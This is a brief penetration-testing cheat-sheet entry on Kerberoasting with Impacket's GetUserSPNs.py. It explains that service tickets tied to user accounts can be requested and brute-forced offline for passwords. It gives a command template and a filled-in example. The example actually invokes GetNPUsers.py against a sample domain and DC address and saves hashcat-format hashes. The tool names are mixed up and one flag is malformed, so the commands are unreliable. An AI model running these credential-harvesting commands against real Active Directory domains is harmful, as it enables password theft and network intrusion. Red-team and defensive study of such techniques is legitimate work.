# Usage
Impacket’s GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account’s password, which can then be bruteforced offline.

## user for

Queries target domain for SPNs that are running under a user account 

## Example
```
GetUsersSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request

/GetNPUsers.py cs.org/kai.bel:password1 -dc-ip 192.168.200.129 -request -format hashcat - outputfile outputfile.txt


```
